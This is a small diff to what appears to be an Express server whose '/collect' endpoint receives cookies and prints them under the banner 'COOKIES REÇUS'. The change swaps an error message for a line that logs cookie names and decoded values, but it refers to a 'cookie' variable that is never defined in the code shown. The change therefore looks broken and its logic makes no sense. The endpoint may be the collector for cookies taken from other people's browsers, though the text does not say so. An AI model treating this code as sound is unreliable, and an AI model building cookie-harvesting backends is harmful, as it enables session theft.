@@ -9,7 +9,7 @@ app.post("/collect", (req, res) => {
   console.log("\n===== COOKIES REÇUS =====\n");
 
   if (!Array.isArray(cookies)) {
-    console.log("❌ cookies n'est pas un tableau !");
+    console.log(`${cookie.name}:${decodeURIComponent(cookie.value)}`);
     return res.json({ status: "error" });
   }
 
